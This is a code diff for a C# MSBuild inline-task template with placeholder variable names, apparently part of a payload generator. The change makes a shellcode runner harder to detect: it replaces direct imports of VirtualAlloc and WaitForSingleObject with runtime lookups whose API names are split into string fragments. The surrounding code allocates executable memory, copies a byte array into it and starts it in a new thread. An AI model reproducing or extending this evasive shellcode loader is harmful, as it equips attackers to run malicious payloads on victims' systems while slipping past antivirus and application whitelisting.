@@ -31,13 +31,18 @@
 		using Microsoft.Build.Framework;
 		using System.Runtime.InteropServices;
 		
-		public class VAR2 :  Task, ITask {	
+		public class VAR2 :  Task, ITask {
+ 
+			[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+			private delegate IntPtr call_VA(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
+			[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+			private delegate IntPtr call_WFSO(IntPtr VAR4, UInt32 VAR17);
+
+			IntPtr DLLFile = LoadLibrary("c:\\windows\\system32\\kernel32.dll");
+
 			private static UInt32 VAR40 = 0x1000;
 			private static UInt32 VAR41 = 0x40;
-			[DllImport("kernel32")]
-			private static extern IntPtr VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
-			[DllImport("kernel32")]
-			private static extern UInt32 WaitForSingleObject(IntPtr VAR4, UInt32 VAR17);
+			
 			[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
 			private delegate IntPtr VAR32(IntPtr VAR7, UInt32 VAR32, IntPtr VAR1, IntPtr VAR8, UInt32 VAR40, ref UInt32 VAR26);
 			[DllImport("kernel32.dll")]
@@ -57,13 +62,20 @@
 				IntPtr VAR34 = GetProcAddress(VAR33, "Crea"+"t"+"eTh"+"read");
 				VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
 [JUNK3]
-				IntPtr VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
+
+				IntPtr FunctionCall_01 = GetProcAddress(DLLFile, "Vir"+"tualAl"+"loc");
+				call_VA FunctionCall_01_Del = (call_VA)Marshal.GetDelegateForFunctionPointer(FunctionCall_01, typeof(call_VA));
+
+				IntPtr FunctionCall_02 = GetProcAddress(DLLFile, "WaitFo"+"rSingleOb"+"ject");
+				call_WFSO FunctionCall_02_Del = (call_WFSO)Marshal.GetDelegateForFunctionPointer(FunctionCall_02, typeof(call_WFSO));
+
+				IntPtr VAR42 = FunctionCall_01_Del(0, (UInt32)VAR11.Length, VAR40, VAR41);
 				Marshal.Copy(VAR11, 0, VAR42, VAR11.Length);
 				IntPtr VAR43 = IntPtr.Zero;
 				IntPtr VAR44 = IntPtr.Zero;
 				UInt32 VAR45 = 0;
 				VAR43 = VAR35(IntPtr.Zero, 0, (IntPtr)VAR42, VAR44, 0, ref VAR45);
-				WaitForSingleObject(VAR43, 0xFFFFFFFF);
+				FunctionCall_02_Del(VAR43, 0xFFFFFFFF);
 				return true;
 			}
 		}
